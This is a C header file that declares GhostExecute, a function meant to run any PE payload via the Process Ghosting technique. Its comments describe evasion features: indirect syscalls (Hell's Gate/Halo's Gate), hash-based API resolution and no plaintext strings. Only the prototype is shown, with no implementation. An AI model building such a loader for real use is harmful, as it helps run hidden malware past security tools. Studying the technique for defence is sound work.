#pragma once

#include "Core/ntdefs.h"

// =====================================================================
// Process Ghosting Module
//
// Executes a PE payload via the Process Ghosting technique:
//   File Object -> Section Object -> Decoupling -> Process -> Thread
//
// Fully integrated with project architecture:
//   - Indirect syscalls (Hell's Gate / Halo's Gate)
//   - Hash-based API resolution
//   - No plaintext strings, no printf
// =====================================================================

// Execute a PE payload via Process Ghosting.
// Payload-source agnostic: accepts any valid PE buffer.
//
// Returns STATUS_SUCCESS (0) on success, NTSTATUS error code on failure.
NTSTATUS GhostExecute(PVOID payloadBuffer, SIZE_T payloadSize);
